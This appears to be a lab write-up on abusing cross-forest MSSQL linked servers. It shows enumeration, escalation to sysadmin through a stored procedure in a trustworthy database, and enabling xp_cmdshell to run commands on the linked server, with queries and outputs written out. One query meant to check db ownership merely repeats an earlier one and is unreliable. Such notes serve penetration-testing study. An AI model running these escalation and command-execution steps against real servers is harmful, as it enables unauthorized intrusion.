Cross-forest MSSQL linked servers facilitate communication and data exchange between SQL Server instances located in different Active Directory forests. This configuration allows SQL Server instances in one forest to access data and resources hosted by SQL Server instances in another forest.

## Scenario
![](attachment/5d89b7d5aaf34a07ac7b84ef416a08af.png)
Considering this scenario 2 MSSQL servers placed on 2 different forest can talk to each others by using what so called **"Server links"**.
The goal here is to compromise the *SQL01* that will allow us to get a foothold into *SQL02* over the other **forest b**.

## What are trustworthy databases?
In Microsoft SQL Server, the **TRUSTWORTHY** database property indicates whether the SQL Server instance trusts the database and its contents. By default, this property is set to **OFF** for security reasons.
Enabling the TRUSTWORTHY property allows certain actions, such as executing code with higher privileges or accessing resources outside the database.

# Attacks
## Privileged Access to Server Links
This attack is possible when a user within our domain (**Inlanefreight.ad**) is given elevated remote login rights to a server in another domain (**logistics.ad**), like *SQL02*, with sysadmin (`sa`) privileges. This grants the user significant control over the server link, potentially opening avenues for exploitation and compromise of the linked server.
### Enumeration
From Windows we would use a Power-shell script to enumerate all the server links on **SQL01** db server.
```powershell-session
import-module .\PowerUpSQL.ps1
PS C:\Tools> Get-SQLServerLink
ComputerName           : SQL01
Instance               : SQL01
DatabaseLinkId         : 0
DatabaseLinkName       : SQL01\SQLEXPRESS
DatabaseLinkLocation   : Local
Product                : SQL Server
Provider               : SQLNCLI
Catalog                :
LocalLogin             :
RemoteLoginName        :
is_rpc_out_enabled     : True
is_data_access_enabled : False
modify_date            : 1/4/2024 1:52:15 AM

ComputerName           : SQL01
Instance               : SQL01
DatabaseLinkId         : 1
DatabaseLinkName       : SQL02\SQLEXPRESS
DatabaseLinkLocation   : Remote
Product                : SQL Server
Provider               : SQLNCLI
Catalog                :
LocalLogin             : inlanefreight\jimmy
RemoteLoginName        : sa
is_rpc_out_enabled     : True
is_data_access_enabled : True
modify_date            : 1/4/2024 2:09:31 AM
```
Consequently we can enumerate the login rights that **Jimmy** have over the linked server(**SQL02**).
```powershell-session
Get-SQLQuery  -Query "EXEC sp_helplinkedsrvlogin"
Linked Server    Local Login         Is Self Mapping Remote Login
-------------    -----------         --------------- ------------
SQL02\SQLEXPRESS inlanefreight\jimmy           False sa
```
Same can be done from Linux in one go!
```shell-session
mssqlclient.py jimmy@10.129.229.188 -windows-auth

SQL (inlanefreight\jimmy  guest@master)> enum_links
SRV_NAME           SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE     SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
----------------   ----------------   -----------   ----------------   ------------------   ------------   -------   
SQL01\SQLEXPRESS   SQLNCLI            SQL Server    SQL01\SQLEXPRESS   NULL                 NULL           NULL      

SQL02\SQLEXPRESS   SQLNCLI            SQL Server    SQL02\SQLEXPRESS   NULL                 NULL           NULL      

Linked Server      Local Login           Is Self Mapping   Remote Login   
----------------   -------------------   ---------------   ------------   
SQL02\SQLEXPRESS   inlanefreight\jimmy                 0   sa             
```
### Abuse time
We can check that Jimmy is admin via MSSQL query.
```sql
select * from openquery("SQL02\SQLEXPRESS",'select IS_SRVROLEMEMBER(''sysadmin'')')
```
And enable the stored procedure "XP_CMDSHELL" that will gain us RCE capabilities over the victim server SQL02.
```sql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "SQL02\SQLEXPRESS"
```
Finally execute commands on the server links.
```sql
EXECUTE('xp_cmdshell "whoami"') AT "SQL02\SQLEXPRESS"
```
Same can be done easier from Linux.
```shell-session
//Choose the link to abuse
SQL (inlanefreight\jimmy  guest@master)> use_link "SQL02\SQLEXPRESS"

//Enable the XP_CMDSHELL
SQL >"SQL02\SQLEXPRESS" (sa  dbo@master)> enable_xp_cmdshell
```
And execute commands.
```shell-session
SQL >"SQL02\SQLEXPRESS" (sa  dbo@master)> xp_cmdshell whoami
output                        
---------------------------   
nt service\mssql$sqlexpress   
```

## Trustworthy Databases
If a user hasn't been promoted as sa over a server linked(as seen before), there is still a possibility to abuse.
In case a user has been chosen as **db_owner** over a *trustworthy database* then attack is feasible and becoming **sa**! 
### Enumeration
Enumeration can be done in Windows by sending this query in MSSQL to check that our current use has no sa rights over the linked server(**1 means no SA!**)
```sql
select * from openquery("SQL02\SQLEXPRESS",'select IS_SRVROLEMEMBER(''public'')')
```
From here we want to enumerate all the trustworthy databases on the linked server.
```sql
select * from openquery("SQL02\SQLEXPRESS",'SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;')
```
Now if we see some databases that are trustworthy(**1 means yes!**) then we must check if our user is owner of this db(again here **1 means yes!**).
```sql
select * from openquery("SQL02\SQLEXPRESS",'SELECT a.name,b.is_trustworthy_on FROM master..sysdatabases as a INNER JOIN sys.databases as b ON a.name=b.name;')
```
All of these steps can be easily obtained by Linux.
```shell-session
//Connect to the istance you control
mssqlclient.py htb-student@10.129.229.188 -windows-auth

//List the available links
SQL (inlanefreight\htb-student  guest@master)> enum_links

//Choose the link to abuse
SQL (INLANEFREIGHT\htb-student  guest@msdb)> use_link "SQL02\SQLEXPRESS"

//Show all the trustworth databases
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@msdb)> enum_db
name          is_trustworthy_on   
-----------   -----------------   
master                        0   
tempdb                        0   
model                         0   
msdb                          1   
htb-reports                   1   
```
Now we need to understand if we are db_owners?
```shell-session
//List all users in DB
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@msdb)> enum_users

//Show if we are db_owners
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@master)> USE <trustworthy_db>;
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@master)> SELECT rp.name AS database_role, mp.name AS database_user FROM sys.database_role_members drm JOIN sys.database_principals rp ON drm.role_principal_id = rp.principal_id JOIN sys.database_principals mp ON drm.member_principal_id = mp.principal_id;

database_role   database_user   
-------------   -------------   
db_owner        dbo             
db_owner        htb-dbuser      
```
### Abuse time
In windows we will start by checking that RPC is active over the linked server(if disabled **remote calls to external servers are not possible**)
```sql
select is_rpc_out_enabled from sys.servers where name='SQL02\SQLEXPRESS'
```
Next we need to add a stored procedure that elevates our user to SA.
```sql
EXEC ('CREATE PROCEDURE sp_escalate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember ''htb-dbuser'',''sysadmin''') AT "SQL02\SQLEXPRESS"
```
Now we can invoke it and check the result.
```sql
EXEC ('sp_escalate;SELECT IS_SRVROLEMEMBER(''sysadmin'');SELECT SUSER_NAME()') AT "SQL02\SQLEXPRESS"
```
Now that we are SA, we can enable XP_CMDSHELL.
```sql
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "SQL02\SQLEXPRESS"
```
And gain RCE capabilities.
```sql
EXECUTE('xp_cmdshell "whoami"') AT "SQL02\SQLEXPRESS"
```
In Linux steps are basically the same.
```shell-session
//Setting the trustworthy DB as mount point
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@msdb)> USE "htb-reports"

//Create the SP
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@msdb)> CREATE PROCEDURE sp_escalate WITH EXECUTE AS OWNER AS EXEC sp_addsrvrolemember 'htb-dbuser','sysadmin'

//Execute the SP
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  htb-dbuser@msdb)> EXEC sp_escalate

//Check success
SELECT is_srvrolemember('sysadmin')  
1
```
Now gain RCE capabilities.
```shell-session
//Enabling the XP_CMDSHELL
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  dbo@master)> enable_xp_cmdshell

//RCE time
SQL >"SQL02\SQLEXPRESS" (htb-dbuser  dbo@master)> xp_cmdshell "whoami"
output                        
---------------------------   
nt service\mssql$sqlexpress   
```